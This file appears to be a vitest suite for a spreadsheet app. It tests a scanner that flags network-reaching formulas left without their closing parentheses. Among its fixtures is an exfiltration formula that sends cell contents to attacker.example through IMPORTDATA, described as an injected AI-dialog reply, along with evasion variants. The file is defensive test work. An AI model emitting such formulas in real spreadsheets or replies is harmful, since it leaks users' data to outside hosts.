import { describe, expect, it } from 'vitest';
import { formulaReachesOut, textReachesOut } from '../src/core/reaches-out.js';
import { FUNCTIONS } from '../src/core/formula/functions.js';
import { Workbook } from '../src/core/workbook.js';

// setInput closes the parentheses a typed formula leaves open (=MAP(A1,IMPORTDATA runs as
// =MAP(A1,IMPORTDATA)), while the scan that decides whether a paste, an AI reply or a file asks
// first took text that did not parse for text that could not run: every bare-name request
// missing its last parenthesis passed both scans and fetched the moment it was stored. The scan
// now judges such text as it will run, and a reaching name in text it cannot read asks rather
// than passes.
const tick = () => new Promise((resolve) => setTimeout(resolve, 0));
const UNCLOSED = [
  '=MAP(url,IMPORTDATA', '=MAP(A1,(IMPORTDATA)', '=BYROW(A1,IMPORTDATA', '=LET(f,IMPORTDATA,f(A1',
  '=SUM(MAP(A1,IMPORTDATA', '=IFERROR(MAP(A1,IMPORTDATA),0', '=REDUCE(0,A1,LAMBDA(a,u,IMPORTDATA(u',
  '=MAP(A1,IMAGE', '=LET(g,AI,g("hi"', '=IF(TRUE,IMPORTRANGE,SUM)(A1,"Sheet1!A1"',
  '=MAP("https://attacker.example/?d="&ENCODEURL(TEXTJOIN(",",1,A1:B1)),IMPORTDATA', // the reply the AI dialog was handed
  '=BYCOL(A1:C1,DETECTLANGUAGE', '=MAKEARRAY(1,1,LAMBDA(r,c,IMPORTHTML(A1,"table",1', '=LET(f, googletranslate, f(A1,"en","fr"',
  '= map(A1, ımportdata', // a dotless ı folds to IMPORTDATA in the evaluator
];
const body = (text) => text.replace(/^=\s*/, '');

describe('a bare-name request that stops short of its closing parentheses', () => {
  it('is flagged by both scans, open or closed, and is stored closed by the entry that would run it', () => {
    const wb = new Workbook();
    const id = wb.activeSheetId;
    for (const text of UNCLOSED) {
      expect(textReachesOut(text), text).toBe(true);
      expect(formulaReachesOut(body(text)), text).toBe(true);
      wb.setInput(id, 0, 0, text);
      const stored = wb.getCell(id, 0, 0).f; // the text after the =, spaces and all, with its parentheses closed
      expect(stored.slice(0, text.length - 1), text).toBe(text.slice(1));
      expect(stored.slice(text.length - 1), text).toMatch(/^\)+$/);
      expect(formulaReachesOut(stored), stored).toBe(true);
      expect(textReachesOut(`=${stored}`), stored).toBe(true);
    }
  });

  it('is blocked once the caller withdraws trust on the scan\'s word, as every entry point does before setInput', async () => {
    const wb = new Workbook();
    const id = wb.activeSheetId;
    const calls = [];
    for (const name of ['IMPORTDATA', 'IMPORTHTML', 'IMPORTRANGE', 'AI', 'TRANSLATE', 'DETECTLANGUAGE']) wb.setAsyncProvider(name, async (text) => { calls.push(`${name}:${text}`); return 'answer'; });
    wb.setInput(id, 0, 0, 'https://attacker.example/a.csv');
    UNCLOSED.forEach((text, i) => {
      if (textReachesOut(text)) wb.setExternalAllowed(false); // the paste gates' and the AI dialog's contract
      wb.setInput(id, i + 1, 0, text);
    });
    expect(wb.externalAllowed).toBe(false);
    UNCLOSED.forEach((text, i) => {
      const value = wb.getValue(id, i + 1, 0);
      expect(value, text).not.toMatchObject({ image: expect.anything() });
      expect(value, text).not.toEqual({ error: '#BUSY!' });
    });
    await tick(); await tick();
    expect(calls).toEqual([]);
  });

  it('asks when a bare reaching name stands in text too deep for the scan to read to the end', () => {
    // The parser overflows long before these lengths; the evaluator may not, everywhere.
    expect(formulaReachesOut(`${'-'.repeat(50000)}MAP(A1,IMPORTDATA)`)).toBe(true);
    expect(formulaReachesOut(`${'('.repeat(20000)}AI${')'.repeat(20000)}`)).toBe(true);
    expect(textReachesOut(`=${'-'.repeat(50000)}LET(f,IMPORTDATA,f(A1))`)).toBe(true);
    // Nothing tells a name in a string apart from a bare one without reading the text: that only costs a question.
    expect(formulaReachesOut(`${'-'.repeat(50000)}LEN("AI")`)).toBe(true);
    // Without a reaching name there is nothing to ask about, however deep.
    expect(formulaReachesOut(`${'-'.repeat(50000)}MAP(A1,SUM)`)).toBe(false);
    expect(formulaReachesOut(`${'('.repeat(20000)}SUM(A1)${')'.repeat(20000)}`)).toBe(false);
    expect(textReachesOut(`=${'-'.repeat(50000)}LEN("AIM")`)).toBe(false);
  });

  it('asks when a bare reaching name stands in text that cannot be read even closed', () => {
    for (const text of ['=MAP(A1,IMPORTDATA,', '=IMPORTDATA)', '=AI is great', '=LET(f,IMPORTDATA', '=(IMPORTRANGE']) {
      expect(textReachesOut(text), text).toBe(true);
      expect(formulaReachesOut(body(text)), text).toBe(true);
    }
    // Still not a formula at all without the leading =, and not a mention when part of another word.
    expect(textReachesOut('MAP(A1,IMPORTDATA')).toBe(false);
    expect(textReachesOut('=MAP(A1,IMPORTDATAX')).toBe(false);
  });
});

describe('the repair adds no question for a formula without a reaching name', () => {
  const REACHING = new Set(['IMPORTDATA', 'IMPORTHTML', 'IMPORTXML', 'IMPORTRANGE', 'WEBSERVICE', 'AI', 'TRANSLATE', 'GOOGLETRANSLATE', 'DETECTLANGUAGE', 'IMAGE']);
  const providers = new Set([...REACHING].map((name) => FUNCTIONS[name]).filter(Boolean));
  // TRUE and FALSE are literals to the parser, not functions: TRUE(A1) is no formula, closed or not.
  const SAFE = Object.keys(FUNCTIONS).filter((name) => !REACHING.has(name) && !providers.has(FUNCTIONS[name]) && name !== 'TRUE' && name !== 'FALSE');
  const shapes = (name) => [
    `${name}(A1`, `${name}(A1,`, `${name}(`, `MAP(A1,${name}`, `LET(f,${name},f(A1`, `SUM(${name}(A1:A3`,
    `IF(A1,${name},SUM)(A1`, `${name}(A1)`, `${name}`,
    // A reaching name inside a string literal, beside the parenthesis the entry will close.
    `"IMPORTDATA"&${name}(A1`, `${name}("AI"`, `IF(A1,${name},"IMPORTDATA"`, `${name}(A1)&"IMAGE"&LEN(A1`,
  ];

  it('for every function the book knows, called or passed bare, open or closed', () => {
    expect(SAFE.length).toBeGreaterThan(400);
    let count = 0;
    for (const name of SAFE) {
      for (const formula of shapes(name)) {
        count++;
        expect(formulaReachesOut(formula), formula).toBe(false);
        expect(textReachesOut(`=${formula}`), formula).toBe(false);
      }
    }
    expect(count).toBeGreaterThan(5000);
  });

  it('for columns, look-alike names, string literals and inline pictures left open', () => {
    for (const formula of ['SUM($AI$1:$AI$9', 'AI1+AI2+SUM(A1', 'SUM(AI:AI', 'Sheet1!AI1+MAX(A1', 'TRANSLATED+LEN(A1', 'MYTRANSLATE(A1', 'AIM(A1', 'AI.RATE*SUM(A1',
      'LEN("IMPORTDATA"', 'IF(A1,"AI","no"', '"IMPORTDATA"&SUM(A1', 'IMAGE("data:image/png;base64,AA=="', 'IMAGE( "DATA:image/png;base64,AA=="', 'IMAGE("data:"&A1',
      'SUM(A1:A3)+LEN("IMAGE"', 'LET(x, "TRANSLATE", LEN(x', 'MAP(A1, LAMBDA(u, "IMPORTRANGE"']) {
      expect(formulaReachesOut(formula), formula).toBe(false);
      expect(textReachesOut(`=${formula}`), formula).toBe(false);
    }
  });
});
